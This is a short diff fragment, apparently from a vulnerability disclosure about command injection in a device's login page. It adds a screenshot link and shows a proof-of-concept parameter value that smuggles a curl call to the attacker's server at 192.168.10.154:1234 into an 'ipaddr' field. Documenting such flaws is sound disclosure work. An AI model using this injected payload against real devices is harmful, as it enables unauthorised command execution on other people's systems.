@@ -97,3 +97,5 @@ page=sys\_login1\&ipaddr=::ffff:192.168.10.154;curl http://192.168.10.154:1234#\
 
 
 1.  **Successful Injection**: After sending the PoC request, the device executes the injected `curl` command, and the attacker’s server (192.168.10.154:1234) records the request, confirming command execution.
+
+![Injection Success: Attacker Server Log](./imgs/5.png)
